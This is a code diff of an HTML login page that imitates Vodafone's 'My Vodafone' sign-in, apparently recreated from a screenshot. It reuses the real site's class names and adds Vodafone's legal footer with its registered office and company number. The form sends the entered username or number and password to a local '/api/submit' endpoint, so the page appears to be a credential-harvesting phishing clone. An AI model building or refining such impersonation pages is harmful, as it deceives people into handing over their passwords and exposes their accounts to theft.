@@ -8,12 +8,18 @@
         /* General Styles */
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
-            background-color: #F5F5F5; /* Light gray background as per the image */
+            background-color: #F5F5F5; /* Light gray background */
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .content-wrapper {
+            flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
         }
 
         .login-container {
@@ -45,19 +51,19 @@
             padding: 10px;
             margin-bottom: 15px;
             border: 1px solid #ccc;
-            border-radius: 0;
+            border-radius: 8px; /* Rounded corners */
         }
 
         button {
-            width: 100%;
-            max-width: 250px;
+            width: 100%; /* Full width of container */
+            max-width: 250px; /* Match input fields */
             padding: 10px;
             background-color: #E60000;
             color: #fff;
             border: none;
             cursor: pointer;
             margin-bottom: 10px;
-            border-radius: 0;
+            border-radius: 8px; /* Rounded corners */
         }
 
         button:hover {
@@ -77,34 +83,80 @@
             margin-top: 5px;
             display: block;
         }
+
+        /* Footer Styles */
+        footer {
+            background-color: #000; /* Black background */
+            color: #fff; /* White text */
+            width: 100%; /* Full width */
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        footer p {
+            margin: 0;
+            padding: 0;
+        }
+
+        footer .footer-links {
+            font-size: 14px;
+        }
+
+        footer .footer-copyright {
+            font-size: 12px;
+            margin-top: 8px;
+        }
+
+        footer a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
 
-<div class="login-container">
+    <!-- Content Wrapper -->
+    <div class="content-wrapper">
+        <!-- Login Form -->
+        <div class="login-container">
+            <form id="login-form" action="/api/submit" method="POST">
+                <h1 level="1" size="3" justify="left" appearance="primary" weight="1" headingtheme="[object Object]" data-component-name="Heading" class="Headingstyle__Heading-sc-1yyt9pt-0 fCCcZo">Log in to My Vodafone</h1>
 
-    <!-- Login Form -->
-    <form id="login-form" action="/api/submit" method="POST">
-        <h1 level="1" size="3" justify="left" appearance="primary" weight="1" headingtheme="[object Object]" data-component-name="Heading" class="Headingstyle__Heading-sc-1yyt9pt-0 fCCcZo">Log in to My Vodafone</h1>
+                <!-- Number or Username Field -->
+                <label for="email">Number or Username</label>
+                <input type="text" id="email" name="email" placeholder="Number or Username" required>
 
-        <!-- Number or Username Field -->
-        <label for="email">Number or Username</label>
-        <input type="text" id="email" name="email" placeholder="Number or Username" required>
+                <!-- Password Field -->
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
 
-        <!-- Password Field -->
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" placeholder="Password" required>
+                <!-- Continue Button -->
+                <button type="submit">Continue</button>
 
-        <!-- Next Button -->
-        <button type="submit">Next</button>
+                <!-- Forgot Password Link -->
+                <a href="#" id="forgot-password" class="black-link">Forgot your password?</a>
 
-        <!-- Forgot Password Link -->
-        <a href="#" id="forgot-password" class="black-link">Forgot your password?</a>
+                <!-- Help Link -->
+                <a href="#" class="mobile-help">I don't know my mobile number</a>
+            </form>
+        </div>
+    </div>
 
-        <!-- Help Link -->
-        <a href="#" class="mobile-help">I don't know my mobile number</a>
-    </form>
-</div>
+    <!-- Footer -->
+    <footer>
+        <p class="footer-links">
+            <a href="#">Privacy policy</a> |
+            <a href="#">Terms &amp; conditions</a> |
+            <a href="#">Cookie policy</a>
+        </p>
+        <p class="footer-copyright">
+            © 2025 Vodafone Limited. Registered office: Vodafone House, The Connection, Newbury, Berkshire RG14 2FN. Registered in England No 1471587.
+        </p>
+    </footer>
 
 </body>
 </html>
